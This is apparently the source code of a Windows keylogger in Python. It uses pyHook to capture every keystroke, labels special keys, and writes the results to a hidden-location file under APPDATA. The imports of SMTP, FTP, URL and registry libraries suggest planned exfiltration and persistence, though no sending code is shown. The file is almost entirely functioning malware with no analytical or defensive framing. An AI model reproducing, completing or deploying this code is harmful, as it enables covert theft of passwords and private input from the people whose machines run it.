import pythoncom, pyHook
import os
import sys
import threading
import thread
from multiprocessing import Process
import urllib,urllib2
import smtplib
import threading
import ftplib
import datetime,time
import win32event, win32api, winerror
import win32console,win32gui
from _winreg import *


x=''
data=''
count=0

LogFile = os.path.join(os.getenv("APPDATA"), "keylogs.txt")
def SaveKeystrokes():
	global data
	fp=open(LogFile,"a")
	fp.write(data)
	fp.close()
	data=''
	return True

def keypressed(event):
	global data
		
	if (event.Ascii == 13):
		keys = ' <ENTER> '
	elif (event.Ascii == 8):
		keys = ' <BACK SPACE> '
	elif(event.Ascii == 9):
		keys = ' <TAB> '
	elif(event.Ascii == 27):
		keys = ' <ESC> '
	elif(event.Ascii == 32):
		keys = ' '# == <space>
	elif(event.Ascii == 127):
		keys = ' <DELETE> '
	else:
		keys=chr(event.Ascii)
	data=data+keys 
	SaveKeystrokes()

def StartKeylogger():
   obj = pyHook.HookManager()
   obj.KeyDown = keypressed
   obj.HookKeyboard()
   pythoncom.PumpMessages()
